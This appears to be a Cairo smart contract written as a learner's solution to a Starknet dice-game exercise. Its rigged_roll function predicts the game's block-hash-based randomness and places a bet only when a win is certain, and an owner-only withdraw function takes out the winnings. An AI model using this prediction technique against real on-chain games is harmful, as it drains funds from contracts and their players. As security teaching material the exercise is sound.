use contracts::DiceGame::{IDiceGameDispatcher, IDiceGameDispatcherTrait};
use starknet::ContractAddress;

#[starknet::interface]
pub trait IRiggedRoll<T> {
    fn rigged_roll(ref self: T, amount: u256);
    fn withdraw(ref self: T, to: ContractAddress, amount: u256);
    fn last_dice_value(self: @T) -> u256;
    fn predicted_roll(self: @T) -> u256;
    fn dice_game_dispatcher(self: @T) -> IDiceGameDispatcher;
}

#[starknet::contract]
mod RiggedRoll {
    use openzeppelin_access::ownable::interface::IOwnable;
use keccak::keccak_u256s_le_inputs;
    use openzeppelin_access::ownable::OwnableComponent;
    use openzeppelin_token::erc20::interface::IERC20CamelDispatcherTrait;
    use starknet::{ContractAddress, get_block_number, get_caller_address, get_contract_address};
    use super::{IDiceGameDispatcher, IDiceGameDispatcherTrait};

    component!(path: OwnableComponent, storage: ownable, event: OwnableEvent);

    #[abi(embed_v0)]
    impl OwnableImpl = OwnableComponent::OwnableImpl<ContractState>;

    impl OwnableInternalImpl = OwnableComponent::InternalImpl<ContractState>;

    #[storage]
    struct Storage {
        dice_game: IDiceGameDispatcher,
        #[substorage(v0)]
        ownable: OwnableComponent::Storage,
        predicted_roll: u256,
    }

    #[event]
    #[derive(Drop, starknet::Event)]
    enum Event {
        #[flat]
        OwnableEvent: OwnableComponent::Event,
    }

    #[constructor]
    fn constructor(
        ref self: ContractState, dice_game_address: ContractAddress, owner: ContractAddress,
    ) {
        self.dice_game.write(IDiceGameDispatcher { contract_address: dice_game_address });
        self.ownable.initializer(owner);
    }

    #[abi(embed_v0)]
    impl RiggedRollImpl of super::IRiggedRoll<ContractState> {
        // ToDo Checkpoint 2: Implement the `rigged_roll()` function to predict the randomness in
        // the DiceGame contract and only initiate a roll when it guarantees a win.
        fn rigged_roll(ref self: ContractState, amount: u256) {
            assert(amount >= 2000000000000000, 'Not enough ETH');
            self
                .dice_game
                .read()
                .eth_token_dispatcher()
                .transferFrom(get_caller_address(), get_contract_address(), amount);
            
            let prev_block: u256 = get_block_number().into() - 1;
            let nonce = self.dice_game.read().nonce();
            
            let array = array![prev_block, nonce];
            let predicted_roll = keccak_u256s_le_inputs(array.span()) % 16;
            self.predicted_roll.write(predicted_roll);
            if predicted_roll > 5 {
                self.dice_game.read().eth_token_dispatcher().transfer(get_caller_address(), amount);
                return;
            }            

            self.dice_game.read().eth_token_dispatcher().approve(self.dice_game.read().contract_address, amount);
            self.dice_game.read().roll_dice(amount);
        }

        // ToDo Checkpoint 3: Implement the `withdraw` function to transfer Ether from the rigged
        // contract to a specified address.
        fn withdraw(ref self: ContractState, to: ContractAddress, amount: u256) {
            assert(self.ownable.owner() == get_caller_address(), 'Only owner can withdraw');
            assert(self.dice_game.read().eth_token_dispatcher().balanceOf(get_contract_address()) >= amount, 'Insufficient balance');
            self.dice_game.read().eth_token_dispatcher().transfer(to, amount);
        }

        fn last_dice_value(self: @ContractState) -> u256 {
            self.dice_game.read().last_dice_value()
        }
        fn predicted_roll(self: @ContractState) -> u256 {
            self.predicted_roll.read()
        }
        fn dice_game_dispatcher(self: @ContractState) -> IDiceGameDispatcher {
            self.dice_game.read()
        }
    }
}
